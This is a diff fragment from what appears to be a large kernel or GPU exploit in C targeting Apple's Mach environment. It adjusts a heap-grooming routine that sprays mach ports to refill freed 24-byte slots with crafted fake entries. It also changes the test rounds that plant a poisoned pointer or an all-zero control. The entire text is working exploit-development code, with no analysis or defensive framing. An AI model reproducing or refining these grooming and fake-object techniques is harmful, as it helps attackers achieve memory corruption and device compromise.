@@ -19387,13 +19387,10 @@ new_modes:
                     pthread_create(&spam_th14[t], NULL, p13_spam_reg, NULL);
 
                 /* Concurrent groomer: continuously fill freed 24-byte slots */
-                /* Safe fake entry: refcnt=1, next=NULL, data=0 */
+                /* Truly safe fake entry: ALL ZERO (slot 0 is next pointer) */
                 uint8_t safe_fake[24];
                 memset(safe_fake, 0, sizeof(safe_fake));
-                uint64_t *sf = (uint64_t *)safe_fake;
-                sf[0] = 0x1; /* refcnt */
-                /* sf[1] = 0; next = NULL */
-                /* sf[2] = 0; data = 0 */
+                /* All slots = 0 → next=NULL terminates GPU walk */
 
                 mach_port_t groom_wps[128];
                 int groom_n = 0;
@@ -19656,8 +19653,8 @@ new_modes:
                 rlog("  Poison: slot %d (+0x%02x) = 0x%llx, others=0\n",
                      poison_slot, poison_slot * 8, (unsigned long long)bad_ptr);
             } else if (rounds == 153) {
-                pf[0] = 0x1; /* safe refcnt */
-                rlog("  Control: all safe [0x1, 0, 0]\n");
+                /* all-zero: truly safe control */
+                rlog("  Control: all zero [0, 0, 0]\n");
             } else {
                 rlog("  No groom (crash baseline)\n");
             }
